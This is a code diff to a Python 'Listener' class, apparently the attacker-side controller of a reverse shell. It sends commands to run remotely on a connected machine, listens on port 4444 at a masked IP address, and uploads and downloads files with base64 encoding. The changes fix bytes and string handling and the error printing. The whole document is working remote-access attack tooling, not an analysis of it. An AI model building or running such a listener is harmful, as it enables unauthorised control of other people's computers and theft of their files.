@@ -28,12 +28,12 @@ class Listener:
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
-            file.write(base64.b64decode(content))
+            file.write(base64.b64decode(content.encode()))
             return "[+] Download successful."
 
     def read_file(self, path):
         with open(path, "rb") as file:
-            return base64.b64encode(file.read())
+            return base64.b64encode(file.read()).decode()
 
     def execute_remotely(self, command):
         self.reliable_send(command)
@@ -52,7 +52,7 @@ class Listener:
             try:
                 if command[0] == "upload":
                     file_content = self.read_file(command[1])
-                    command.append(file_content.decode())
+                    command.append(file_content)
 
                 result = self.execute_remotely(command)
 
@@ -60,8 +60,7 @@ class Listener:
                     result = self.write_file(command[1], result)
             except Exception:
                 result = "[-] Error executing command"
-
-                print(result)
+            print(result)
 
 my_listener = Listener("xx.x.x.xx", 4444)
 my_listener.run()
